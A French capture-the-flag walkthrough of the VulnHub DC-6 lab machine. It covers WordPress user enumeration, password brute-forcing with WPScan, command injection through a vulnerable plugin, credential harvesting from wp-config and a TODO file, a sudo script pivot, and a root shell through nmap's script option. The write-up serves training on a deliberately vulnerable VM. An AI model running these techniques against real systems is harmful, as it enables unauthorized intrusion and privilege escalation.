---
title: "Solution du CTF DC: 6 de VulnHub"
tags: [VulnHub, CTF]
---

Retrouvez le DC6 [sur VulnHub](https://vulnhub.com/entry/dc-6,315/).

## Cache-cache avec un plugin

Nmap y trouve un Wordpress avec plusieurs utilisateurs :

```console
$ sudo nmap -sCV -p- --script vuln -T5 192.168.56.137
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 22:01 CET
Nmap scan report for 192.168.56.137
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-wordpress-users: 
| Username found: admin
| Username found: graham
| Username found: mark
| Username found: sarah
| Username found: jens
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-server-header: Apache/2.4.25 (Debian)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.25: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
--- snip ---
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
MAC Address: 08:00:27:8D:8E:C4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.93 seconds
```

Ce qui nous intéresse ici, c'est surtout la détection de 5 comptes utilisateurs sur le Wordpress. On peut lancer `WPscan` pour tenter de trouver des plugins vulnérables, mais aucun plugin ne semble détecté même en énumération active.

Je pars donc sur un classique brute-force des comptes et après un moment, je ne demande s'il n'y a pas un indice pour s'éviter de perdre trop de temps. Ce qui est le cas :

> **CLUE**
> 
> OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job.
>
> cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)
 
Je réduis donc la wordlist aux mots contenants `k01` et je relance l'attaque :

```bash
docker run -v /tmp/:/data/ --add-host wordy:192.168.56.137 -it --rm wpscanteam/wpscan --url http://wordy/ -U admin,sarah,graham,mark,jens -P /data/k01.txt
```

Un compte en ressort :

```console
[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01
```

Une fois connecté on découvre qu'aucun des comptes (en dehors de `admin`) n'est privilégié. Par conséquent, pas d'obtention classique de RCE via modification d'un thème du CMS.

Mais dans le menu, on découvre qu'il y a bien un plugin installé et ce dernier serait vulnérable à une RCE :

[WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50110)

En lisant le code d'exploitation, on devine qu'il y a une bête injection de commande dans une page permettant de faire un lookup...

Pas besoin d'exploit, on peut faire cela à la main :

![VulnHub DC6 Wordpress Activiry Monitor Plugin](/assets/img/vulnhub/dc6_activity_monitor_wp_vulnerability.png)

## Saute-accounts

Une fois un shell obtenu mon réflexe habituel est de chopper les identifiants de la BDD :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */

define('WP_HOME','http://wordy');
define('WP_SITEURL','http://wordy');

define( 'DB_NAME', 'wordpressdb' );

/** MySQL database username */
define( 'DB_USER', 'wpdbuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'meErKatZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Et de fouiller dans la table des utilisateurs :

```sql
MariaDB [wordpressdb]> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 |
| graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 |
| mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ |
| sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ |
| jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 |
+------------+------------------------------------+
5 rows in set (0.00 sec)
```

Aucun des hashes ne s'avère utile. Voyons les fichiers des utilisateurs :

```console
www-data@dc-6:/home$ find . -type f -ls 2> /dev/null 
   156190      4 -rw-r--r--   1 jens     jens          675 Apr 24  2019 ./jens/.profile
   156364      4 -rw-------   1 jens     jens            5 Apr 26  2019 ./jens/.bash_history
   156806      4 -rwxrwxr-x   1 jens     devs           50 Apr 26  2019 ./jens/backups.sh
   156196      4 -rw-r--r--   1 jens     jens          220 Apr 24  2019 ./jens/.bash_logout
   156199      4 -rw-r--r--   1 jens     jens         3526 Apr 24  2019 ./jens/.bashrc
   153306      4 -rw-r--r--   1 mark     mark          675 Apr 24  2019 ./mark/.profile
   156200      4 -rw-------   1 mark     mark            5 Apr 26  2019 ./mark/.bash_history
   156188      4 -rw-r--r--   1 mark     mark          220 Apr 24  2019 ./mark/.bash_logout
   156191      4 -rw-r--r--   1 mark     mark         3526 Apr 24  2019 ./mark/.bashrc
   156363      4 -rw-r--r--   1 mark     mark          241 Apr 26  2019 ./mark/stuff/things-to-do.txt
   153032      4 -rw-r--r--   1 sarah    sarah         675 Apr 24  2019 ./sarah/.profile
   156192      4 -rw-r--r--   1 sarah    sarah         220 Apr 24  2019 ./sarah/.bash_logout
   156195      4 -rw-r--r--   1 sarah    sarah        3526 Apr 24  2019 ./sarah/.bashrc
   153036      4 -rw-r--r--   1 graham   graham        675 Apr 24  2019 ./graham/.profile
   156194      4 -rw-------   1 graham   graham          5 Apr 26  2019 ./graham/.bash_history
   156186      4 -rw-r--r--   1 graham   graham        220 Apr 24  2019 ./graham/.bash_logout
   156187      4 -rw-r--r--   1 graham   graham       3526 Apr 24  2019 ./graham/.bashrc
```

La TODO list est intéressante :

> Things to do:
>
> - Restore full functionality for the hyperdrive (need to speak to Jens)
> - Buy present for Sarah's farewell party
> - Add new user: graham - GSo7isUM1D4 - done
> - Apply for the OSCP course
> - Buy new laptop for Sarah's replacement
 
Le mot de passe permet de se connecter en tant que `Graham` qui est membre du groupe `devs`.

```console
graham@dc-6:/home/jens$ ls -al
total 28
drwxr-xr-x 2 jens jens 4096 Apr 26  2019 .
drwxr-xr-x 6 root root 4096 Apr 26  2019 ..
-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh
-rw------- 1 jens jens    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc
-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile
graham@dc-6:/home/jens$ cat backups.sh 
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:/home/jens$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

`Graham` peut exécuter le script `backups.sh` avec les privilèges de `jens` or le fichier est modifiable par tous les membres du groupe `devs`.

J'ai donc simplement mis un appel à bash à l'intérieur.

```console
graham@dc-6:/home/jens$ sudo -u jens /home/jens/backups.sh
jens@dc-6:~$ id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

Dernière étape, l'utilisation d'un [GTFObin pour Nmap](https://gtfobins.github.io/gtfobins/nmap/#sudo) :

```console
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > yolo
jens@dc-6:~$ sudo /usr/bin/nmap --script=yolo

Starting Nmap 7.40 ( https://nmap.org ) at 2023-03-22 08:19 AEST
NSE: Warning: Loading 'yolo' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
# # theflag.txt
# 

Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
